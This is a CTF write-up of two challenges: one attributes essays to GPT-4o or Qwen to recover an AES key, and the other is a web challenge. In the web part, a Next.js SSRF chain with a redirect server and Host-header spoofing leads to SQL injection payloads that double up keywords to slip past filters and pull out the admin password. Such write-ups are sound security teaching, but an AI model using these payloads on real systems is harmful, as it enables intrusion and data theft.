## ai - GPT Detector

>Tired of Turnitin AI detector? It's time to show your reverse card...

We're given 64 files each of `openai/gpt-4o` and `qwen/qwen-2.5-72b-instruct` responses to a prompt, that were randomly shuffled and used to generate an AES key to encrypt the flag (0 bit for qwen, 1 for gpt). We need to classify most of the files, so that the remaining bits can be bruteforced. We also have the response generation and encryption code, including the prompt.

```python
def generate(model):
    completion = client.chat.completions.create(
        model=model,
        messages=[{
            "role": "system",
            "content": "You are a helpful assistant."
        }, {
            "role": "user",
            "content": "Write a random interesting 500-word essay in English. Do not use markdown formatting. Do not write any title."
        }]
    )

    return completion.choices[0].message.content
```

At first glance I found a couple of LLM detection papers including this [perplexity approach](https://arxiv.org/abs/2305.15004), but nothing that could do attribution without a bunch of expensive training data. And most of the binary classification was human vs AI, rather than model vs model. So I pivoted to binary k-means clustering with [sentence transformers](https://sbert.net/) and later [TfidfVectorizer](https://scikit-learn.org/stable/modules/generated/sklearn.feature_extraction.text.TfidfVectorizer.html). This seemed pretty reasonable, the models are from different companies so surely they'd use different vocabulary? Each response was pretty large too so I assumed semantic analysis wasn't intended. Even though my teammate teddy generated a bunch of gpt responses, and got the feeling gpt responses included more scientific topics.

```python

# Create and fit vectorizer on all texts (train + test)
vectorizer = TfidfVectorizer(ngram_range=(2, 4), max_features=200)
all_texts = train_texts + test_texts
X_all = vectorizer.fit_transform(all_texts)

# Split into train and test features
X_train = X_all[:len(train_texts)]
X_test = X_all[len(train_texts):]

# Train KMeans using labeled data
kmeans = KMeans(n_clusters=2, random_state=42)
kmeans.fit(X_train)

# Get cluster centers and ensure they align with our labels
# Calculate average distance to each center for each class
dist_0 = np.mean([kmeans.transform(X_train[i].reshape(1, -1))[0]
                 for i, label in enumerate(train_labels) if label == 0], axis=0)
dist_1 = np.mean([kmeans.transform(X_train[i].reshape(1, -1))[0]
                 for i, label in enumerate(train_labels) if label == 1], axis=0)

# Determine if we need to flip cluster assignments
flip_clusters = (dist_0[0] > dist_0[1])  # True if cluster 1 is closer to class 0

# Predict test samples
distances = kmeans.transform(X_test)
diff = distances[:, 1] - distances[:, 0]

# Sort indices by confidence (diff value)
indices_sorted = np.argsort(diff)

# Force balanced labels - assign 64 to each class
balanced_labels = np.empty(len(test_texts), dtype=int)
if flip_clusters:
    # More positive diff means closer to cluster 1
    balanced_labels[indices_sorted[:64]] = 1  # Most negative diff -> class 1
    balanced_labels[indices_sorted[64:]] = 0  # Most positive diff -> class 0
else:
    # More negative diff means closer to cluster 0
    balanced_labels[indices_sorted[:64]] = 0  # Most negative diff -> class 0
    balanced_labels[indices_sorted[64:]] = 1  # Most positive diff -> class 1

# Compute confidence as absolute difference between distances
confidence = np.abs(diff)

# Create results dictionary with balanced labels
results = {}
for filename, label, conf in zip(test_filenames, balanced_labels, confidence):
    results[filename] = (label, conf)
```

But confidence levels on the classifier were pretty low even after optimising for n-grams. teddy manually labelled a dozen or so responses, so I tried tuning the vectorizer against them or even outright training. Took a while to realise it was just overfitting. I was a few hours in at this point and took a break, while teddy generated some sample data from both models with OpenRouter and the provided generation script.

I came back to try using the data for training, but realised by dumping features that word/phrase choice was pretty similar between models unfortunately. Same with a brief attempt at prefix/suffix strings. So at this point I was ready to scrap the whole sentence approach and revisit perplexity or something. teddy had spent a while with samples at this point too and reckoned word features weren't viable.

we were past midnight when teddy realised the file sizes for the qwen samples were consistently larger than the GPT samples, around 4000-5000 bytes. So we could fix the bits for files over a certain size, and bruteforce the rest. Unfortunately taking a conservative 4500 bytes only gave us 38 files (38 known bits) and the remainder wasn't feasible to bruteforce. I wrote a script to sort by file size anyway for something to do, hoping I could work my way down from 4500 and see how long the remaining bits took. I was sent this screenshot in response.

![[Pasted image 20250330141916.png|Pasted image 20250330141916.png]]

After a fair bit of testing, teddy realised the file count was also a good heuristic, seemingly above the 500-600 range for qwen. I quickly modified my script to find files above 600 words, and ended up with this:

```python
import os
from pathlib import Path

ESSAYS_DIR = "essays"
WORD_LIMIT = 600

def count_words(file_path):
    with open(file_path, 'r', encoding='utf-8') as f:
        text = f.read()
        return len(text.split())

def clean_filename(filename):
    # Remove extension and any leading zeros
    name = filename.rsplit('.', 1)[0]  # Remove extension
    return str(int(name)) if name.isdigit() else name

qwen_count = 0
gpt_count = 0

files_info = []
# Walk through essays directory
for file_path in Path(ESSAYS_DIR).glob('*'):
    if file_path.is_file():
        word_count = count_words(file_path)
        classification = "qwen" if word_count > WORD_LIMIT else "gpt"
        files_info.append((file_path.name, word_count, classification))
        if classification == "qwen":
            qwen_count += 1
        else:
            gpt_count += 1

# Sort files by word count (descending)
files_info.sort(key=lambda x: x[1], reverse=True)

# Display summary first
print(f"Summary:")
print(f"Qwen files: {qwen_count}")
print(f"GPT files: {gpt_count}\n")

# Display only file numbers for Qwen files
print("Qwen files (most words to least):")
for name, count, classification in files_info:
    if classification == "qwen":
        clean_name = clean_filename(name)
        print(clean_name)

```

Which was quick to plug into my multithreaded bruteforcing script - not so infeasible now.

But it immediately failed. There were 63 files with over 600 words, it was too good to be true. So I started working my way down, commenting out files with the least number of words (51, 26, and 52 in the list) that would be the most likely false positives. Until I eventually hit the solve!

![[Pasted image 20250330011017.png|Pasted image 20250330011017.png]]

teddy had been writing his own bruteforce in the background, with only 59 known bits (different word counter maybe?), and his finished around 15 minutes later.

It seemed a bit offtopic for an AI chal rather than misc though. Turns out the intended solve was calculating perplexity using qwen's open weights, and the author was pretty disappointed. dfyz used a really nice approach though - qwen logprob of next token for each response - and I hope they do a writeup. That might be a generalised solution too.
## web - Hide and Seek

>Play Hide-and-Seek with pretty button!  
( + I don't know the internal web server's port exactly, but I heard it's "well-known". )

A three-tier webapp, we only get source for the external nextjs server and a `docker-compose.yml` with static IPs for the internal webserver and db. The nextjs server had a single endpoint `POST /api/reset-game`, with blind SSRF in a body parameter `{"url":"https://webhook.tplant.com.au/273441c2-d8d2-47fb-bb3d-107187ac0560"}`.

```ts
const response = await fetch(`${body.url}?date=${Date()}&message=Congratulation! you found button!`, {
	method: "GET",
	redirect: "manual",
});
...
return NextResponse.json({ message: "Sended!" }, { status: 200 });
```

It would ratelimit clients by IP from `x-forwarded-for` for 10 mins after a successful request to `url`, but not unsuccessful, so I bruteforced the internal webserver port hinted by the flavourtext to get `http://192.168.200.120:808`. I could also control URL params, by adding a fragment to remove the existing params:

`http://192.168.200.120:808/?foo=bar# -> http://192.168.200.120:808/?foo=bar#?date=...&message=Congratulation! you found button!`

I got stuck for a while here, trying to confirm it was actually blind. It would've been a pain to chain an SSRF on the webserver without source code. Eventually I found this [Assetnote post on a nextjs GET SSRF n-day](https://www.assetnote.io/resources/research/digging-for-ssrf-in-nextjs-apps) , and realised the frontend was an ancient nextjs version (`v14.1.0` right before the vuln was patched). I threw together a webhook to test.

```python
from flask import Flask, Response, request, redirect
app = Flask(__name__)

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def catch(path):
    if request.method == 'HEAD':
        resp = Response("")
        resp.headers['Content-Type'] = 'text/x-component'
        return resp
    return redirect('http://192.168.200.120:808')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
```

Then implemented `Host` spoofing from the post. This took way longer than it should've, I really need to build better [[Tooling|Tooling]]...

```python
import requests

headers = {
    "Host": "scene-settings-her-licence.trycloudflare.com",  # Using the spoofed host as requested
    "Next-Action": "6e6feac6ad1fb92892925b4e3766928a754aec71",
    "Next-Router-State-Tree": "%5B%22%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36 Edg/132.0.0.0"
}

response = requests.post("http://3.38.141.72:3000/", data='[]', headers=headers)
print(response.text)
```

And we hit the homepage!

The obvious `/login?key=392cc52f7a5418299a5eb22065bd1e5967c25341&username=guest&password=guest` just returned `{"message":"Welcome! guest, You are not admin."}` though, and I got stuck for a while thinking we needed to access the response's `Set-Cookie` somehow. Or mint our own cookie - yep, this is what JWT brainrot looks like. I even hashcracked the key (`neverguessable`). But in the last half hour I realised it was just SQLi in `username` or `password`... So I pulled in teammates to help.

`username` and `or` were getting replaced, so we couldn't just `or 1=1`. We tried unicode substitution and comments like `user/**/name`, but bradan came in clutch with `userusernamename` for `username=test\' UNION SELECT * from users WHERE userusernamename LIKE \'%\'-- ;`. That got us the `aaa` user, then it took an intense couple minutes to figure out `admin` was also substituted.

`LIKE \'admadminin\'` authenticated and the server response told us the flag was the password. toasterpwn tried a column select and after some frantic attempts with `password`, we finally got `username=test\' UNION SELECT passwoorrd,1 from users WHERE userusernamename LIKE \'admadminin\' -- ;` and the flag `codegate2025{83ef613335c8534f61d83efcff6c2e18be19743069730d77bf8fb9b18f79bfb9}`.
